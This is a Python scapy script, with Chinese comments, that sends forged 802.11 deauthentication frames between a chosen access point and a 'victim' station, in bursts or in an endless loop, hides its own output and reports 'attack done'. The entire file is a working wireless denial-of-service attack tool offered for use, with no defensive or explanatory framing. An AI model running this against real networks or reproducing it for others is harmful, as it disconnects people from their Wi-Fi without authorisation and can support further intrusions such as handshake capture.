#!/usr/bin/python
#-*-coding:utf-8-*-

import os,sys,copy,argparse

'''
802.11的解除认证帧的subtype==0x0c
'''

from scapy.all import *

defaultStdout = sys.stdout

iface = 'your listening port'
ap_mac = 'ap mac'
sta_mac = 'victim mac'
times = 1


def handleArgv():
    global ap_mac,sta_mac,iface,times
    parser = argparse.ArgumentParser()
    parser.add_argument('-a','--ap_mac','--ap',type=str,default='f0:b4:29:57:37:d7')
    parser.add_argument('-s','--sta_mac','--sta',type=str,default='10:f6:81:f4:fa:63')
    parser.add_argument('-i','--iface',type=str,default='mon0')
    parser.add_argument('-t','--times',type=int,default=1)
    argv = parser.parse_args()
    ap_mac = argv.ap_mac
    sta_mac = argv.sta_mac
    iface = argv.iface
    times = argv.times
    #print(argv)


def startDeauthentication(iface='mon0',ap_mac='f0:b4:29:57:37:d7',sta_mac='10:f6:81:f4:fa:63',times=1):

    '''
    用来使sendp函数显示的信息消失的类
    '''
    class Redirect:
        def __init__(self):
            self.content = ''
            self.savedStdout = sys.stdout
            self.hidden = None
        '''
        def write(self,outStr):
            #self.content += outStr
            pass
        '''
        def recover(self):
            sys.stdout = self.savedStdout
        def redirect(self):
            self.hidden = open(os.devnull,'w')
            sys.stdout = self.hidden


    ap2sta = RadioTap(len=12,present='Rate+b15',notdecoded='\x02\x00\x18\x00')\
            /Dot11(ID=14849,addr1=sta_mac,addr2=ap_mac,addr3=ap_mac,addr4=None)\
            /Dot11Deauth(reason='class3-from-nonass')
    sta2ap = RadioTap(len=12,present='Rate+b15',notdecoded='\x02\x00\x18\x00')\
            /Dot11(ID=14849,addr1=ap_mac,addr2=sta_mac,addr3=ap_mac,addr4=None)\
            /Dot11Deauth(reason='class3-from-nonass')
    deauth = [ap2sta,sta2ap]
    deauth[0].addr2=deauth[0].addr3 = ap_mac
    deauth[0].addr1 = sta_mac
    deauth[1].addr1=deauth[1].addr3 = ap_mac
    deauth[1].addr2 = sta_mac

    r = Redirect()
    r.redirect()
    if times == 0:
        while True:
            j = -1
            for i in range(128):
                if i%2 == 0:
                    j = j+1
                pkt = copy.deepcopy(deauth[i%2])
                pkt.SC = pkt.SC + j*32
                #print(j,':',pkt.SC)
                sendp(pkt,iface=iface)
    else:
        for time in range(times):
            j = -1
            for i in range(128):
                if i%2 == 0:
                    j = j+1
                pkt = copy.deepcopy(deauth[i%2])
                pkt.SC = pkt.SC + j*32
                #print(j,':',pkt.SC)
                sendp(pkt,iface=iface)
    r.recover()


if __name__ == '__main__':
    handleArgv()
    startDeauthentication(iface,ap_mac,sta_mac,times)
    print('\nattack done')
    